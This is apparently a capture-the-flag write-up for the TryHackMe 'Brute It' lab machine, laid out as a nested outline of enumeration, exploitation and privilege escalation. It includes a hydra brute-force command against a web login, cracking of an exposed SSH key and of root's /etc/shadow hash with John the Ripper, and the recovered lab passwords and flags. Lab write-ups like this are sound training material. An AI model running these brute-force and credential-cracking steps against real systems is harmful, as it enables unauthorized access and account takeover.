# [Challenge](https://tryhackme.com/room/bruteit)

- # ENUM
	- ### nmap(`sudo nmap -sS -sV -A -p- -T4 bruteIt`)
		- ```PORT   STATE    SERVICE  VERSION
			22/tcp open     ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
			| ssh-hostkey: 
			|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
			|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
			|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
			71/tcp filtered netrjs-1
			80/tcp open     http     Apache httpd 2.4.29 ((Ubuntu))
			|_http-title: Apache2 Ubuntu Default Page: It works
			|_http-server-header: Apache/2.4.29 (Ubuntu)
			Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```
	- ### gobuster (`gobuster dir -w /usr/share/wordlists/directory-list-lowercase-2.3-big.txt -u http://bruteIt -x .html,.js,.txt,.php,.css`)
		- #### DIRECTORIES
			- `/admin`
		- #### FILES
			- `/index.html`

- # EXPLOITATION
	- Use hydra for bruteforcing password (username: admin): `hydra -l admin -P /usr/share/wordlists/rockyou.txt bruteIt http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid" -t 64 -V -I`
		- password: `xavier`
			- `THM{brut3_f0rce_is_e4sy}`
	- http://bruteit/admin/panel/id_rsa -> John's RSA private key!
		- Let's use `johntheripper`
			- `ssh2john id_rsa > id_rsa.hash`
			- `john id_rsa.hash`
				- password: `rockinroll`
	- Let's log into SSH (`chmod 600 id_rsa` -> `ssh -i id_rsa john@bruteit`)
		- `THM{a_password_is_not_a_barrier}`

- # PRIVILEGE ESCALATION
	- `sudo -l`
		- `/bin/cat` as root! Let's check `/etc/shadow`.
			- Let's copy all the `/etc/shadow` file (SHA-512) and run `johntheripper` again:
				- `john hashes`
					- password: `football`
	- `su root`
		- We're root now!
